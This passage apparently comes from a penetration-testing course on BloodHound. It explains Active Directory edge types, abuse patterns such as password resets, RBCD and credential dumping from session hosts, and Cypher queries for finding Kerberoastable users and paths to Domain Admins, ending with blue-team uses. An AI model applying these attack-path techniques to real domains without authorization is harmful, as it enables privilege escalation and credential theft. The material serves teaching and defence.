DomainGlobe iconfunctionallevel, domain SID, trust relationships
OUFolder iconlinked GPOs, contained objects
GPODocument icongpcpath, displayname, linked OUs
Key Node Information Categories

Click any node to open its info panel, which displays multiple tabs:

  • Overview: basic object properties (name, domain, SID, enabled status)
  • Group Membership: direct and transitive (unrolled) memberships
  • Local Admin Rights: computers where this principal has admin access
  • Execution Rights: RDP, DCOM, PSRemote, SQLAdmin
  • Outbound Control: objects this principal has control over via ACLs
  • Inbound Control: principals that have control over this object

3.3.3 Edges

Edges represent relationships between nodes. Understanding edge types is critical for identifying abuse paths.

List of AD Edges
EdgeCategoryMeaning
MemberOfGroupPrincipal is a member of the target group
AdminToLocal AdminPrincipal has local admin on the target computer
HasSessionSessionTarget user has an active session on the source computer
GenericAllACLFull control over the target object
GenericWriteACLCan write to any non-protected attribute
WriteDaclACLCan modify the DACL (add new ACEs)
WriteOwnerACLCan take ownership of the target object
ForceChangePasswordACLCan reset target user's password without knowing current
AddMemberACLCan add principals to the target group
AllExtendedRightsACLAll extended rights (DCSync, password read)
CanRDPExecutionCan RDP to the target computer
CanPSRemoteExecutionCan use PowerShell Remoting to the target
SQLAdminExecutionHas sysadmin role on target SQL Server
AllowedToDelegateDelegationConstrained delegation to the target SPN
AllowedToActDelegationResource-based constrained delegation configured
How to Abuse Edges

Right-click an edge in BloodHound and select "Help" to see step-by-step abuse instructions. Each edge type has documented abuse primitives. Common patterns:

  • GenericAll on User: reset password, set SPN for Kerberoasting, or write to msDS-KeyCredentialLink (Shadow Credentials)
  • GenericAll on Group: add yourself as a member
  • GenericAll on Computer: configure RBCD for lateral movement
  • WriteDacl: add GenericAll ACE for yourself on the target, then abuse that
  • WriteOwner: take ownership, then WriteDacl to add permissions
  • HasSession + AdminTo: dump credentials from the session host
BloodHound Edge Playground Reference

The BloodHound Edge Playground is a community-maintained reference documenting every edge type with abuse information, required tools, and OPSEC considerations. Key reference edges for offensive operations:

  • Transitive edges: MemberOf is transitive; if User A is in Group B and Group B is in Group C, User A inherits Group C's permissions
  • Composite edges: some attack paths require chaining multiple edges (e.g., ForceChangePassword + HasSession + AdminTo)
  • Shortcut edges: GenericAll encompasses multiple individual rights and is the most powerful single ACL edge

3.3.4 Analyzing BloodHound Data

BloodHound's value is in finding non-obvious attack paths. Structured analysis focuses on domain mapping, pre-built queries, and session-based attacks.

Domain Mapping and Analysis

Start by understanding the domain structure:

# Cypher: count of users, computers, groups
MATCH (u:User) RETURN count(u)
MATCH (c:Computer) RETURN count(c)
MATCH (g:Group) RETURN count(g)

# Find all domain controllers
MATCH (c:Computer)-[:MemberOf*1..]->(g:Group {name:"DOMAIN CONTROLLERS@CORP.LOCAL"}) RETURN c.name
  • Map trust relationships between domains and forests
  • Identify tier-zero assets (Domain Admins, Enterprise Admins, DC computer accounts)
  • Enumerate high-value targets: Exchange servers, ADCS CAs, SCCM servers
Pre-Built Analytics Queries

BloodHound ships with pre-built queries accessible from the Analysis tab:

  • Find All Domain Admins: maps members of Domain Admins and equivalent groups
  • Find Shortest Paths to Domain Admins: shows the most direct routes
  • Find Kerberoastable Users with Most Privileges: identifies high-value SPN accounts
  • Find AS-REP Roastable Users: users with "Do not require pre-auth" set
  • Find Principals with DCSync Rights: users/groups with replication permissions
  • Shortest Paths from Owned Principals: attack paths from already-compromised accounts
  • Find Computers with Unconstrained Delegation: potential TGT capture hosts
Finding Sessions and Using Owned Principals

Mark compromised principals as "Owned" (right-click a node, select "Mark as Owned"). This enables BloodHound's most powerful query: "Shortest Paths from Owned Principals to Domain Admins." As new credentials are captured during an engagement, continue marking principals as owned to reveal new paths.

Session data enables credential-theft-based paths:

  • If a high-privilege user has a session on a machine where you have admin, dump their credentials
  • Use "Find Workstations where Domain Users can RDP" to find initial lateral movement targets
  • Derivative admin: if User A has admin on Machine X, and Machine X has a session from User B (who is Domain Admin), User A can compromise Domain Admin

Methodology

  • Check the Database Info panel to verify collection completeness (user, computer, group, session counts)
  • Use the pathfinding bar to find shortest paths from a compromised user to Domain Admins
  • Mark all compromised principals as Owned (right-click node, select "Mark as Owned"), then run "Shortest Paths from Owned Principals"
  • Run pre-built analytics queries: Find Kerberoastable Users, AS-REP Roastable Users, Unconstrained Delegation Computers, Principals with DCSync Rights
  • Inspect node info panels for high-value targets: check Local Admin Rights, Outbound Control, and Execution Rights tabs
  • Identify derivative admin paths: find machines where you have admin that also have sessions from high-privilege users (HasSession + AdminTo chain)
  • Right-click abusable edges (GenericAll, WriteDacl, WriteOwner, ForceChangePassword) and select "Help" for step-by-step abuse instructions

3.4 Cypher Queries and Blue Team

Cypher is the query language for Neo4j. Custom Cypher queries allow advanced analysis beyond BloodHound's pre-built queries.

3.4.1 Cypher Queries

Cypher is the query language for Neo4j. Custom Cypher queries allow advanced analysis beyond BloodHound's pre-built queries.

Cypher Syntax Fundamentals

Cypher uses an ASCII-art pattern syntax to describe graph patterns:

# Nodes are wrapped in parentheses
(n)                    # anonymous node
(u:User)               # node with label User
(u:User {name:"JDOE@CORP.LOCAL"})  # node with property filter

# Relationships are wrapped in brackets inside arrows
-[r]->                 # directed relationship
-[r:MemberOf]->        # relationship with type
-[r:MemberOf*1..]->    # variable-length path (1 or more hops)

# Full pattern
MATCH (u:User)-[:MemberOf*1..]->(g:Group) RETURN u.name, g.name
Basic Cypher Queries
# All enabled users
MATCH (u:User {enabled:true}) RETURN u.name

# All computers running Windows Server
MATCH (c:Computer) WHERE c.operatingsystem CONTAINS "Server" RETURN c.name, c.operatingsystem

# Users with SPN set (Kerberoastable)
MATCH (u:User {hasspn:true, enabled:true}) RETURN u.name, u.serviceprincipalnames

# Users with "Do not require pre-authentication" (AS-REPRoastable)
MATCH (u:User {dontreqpreauth:true, enabled:true}) RETURN u.name

# All Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN u.name
Depth Traversal and Filtering
# Shortest path from a user to Domain Admins
MATCH p=shortestPath((u:User {name:"JDOE@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

# All paths up to 5 hops
MATCH p=(u:User {name:"JDOE@CORP.LOCAL"})-[*1..5]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN p

# Filter by edge type
MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN p
Analyzing Built-in Queries

Enable the "Debug" toggle in Settings to see the raw Cypher behind every pre-built query. This reveals the exact patterns used and helps build custom variants. For example, the "Shortest Paths to Domain Admins" query can be modified to target Enterprise Admins or other high-value groups.

Advanced and Custom Queries
# Computers with unconstrained delegation (excluding DCs)
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS "DC" RETURN c.name

# Users that can DCSync
MATCH (u)-[:GetChanges]->(d:Domain) MATCH (u)-[:GetChangesAll]->(d) RETURN u.name

# Kerberoastable users with a path to Domain Admins
MATCH (u:User {hasspn:true, enabled:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN u.name, length(p)

# Computers where Domain Users have local admin
MATCH (g:Group {name:"DOMAIN USERS@CORP.LOCAL"})-[:AdminTo]->(c:Computer) RETURN c.name

# Find all GPOs that apply to a specific OU
MATCH (o:OU)-[:GpLink]->(g:GPO) RETURN o.name, g.name

# Principals with constrained delegation
MATCH (u)-[:AllowedToDelegate]->(c:Computer) RETURN u.name, c.name
Saving Custom Queries

Save frequently used queries in BloodHound's custom queries panel. In BloodHound Legacy, edit the customqueries.json file in the BloodHound config directory. In BloodHound CE, queries can be saved from the query editor.

{
  "queries": [
    {
      "name": "High Value Kerberoastable Users",
      "queryList": [
        {
          "final": true,
          "query": "MATCH (u:User {hasspn:true,enabled:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {highvalue:true})) RETURN p"
        }
      ]
    }
  ]
}

3.4.2 BloodHound for Blue Teams

Defenders use BloodHound to identify and eliminate attack paths before adversaries exploit them. The approach mirrors offensive analysis but focuses on remediation:

  • Identify Tier-Zero attack paths: find all paths to Domain Admins and prioritize breaking the shortest ones
  • Audit ACLs: run queries for excessive permissions (GenericAll, WriteDacl on sensitive objects)
  • Review delegation: find unconstrained and constrained delegation misconfigurations
  • Session hygiene: identify machines where privileged users have sessions on low-trust workstations
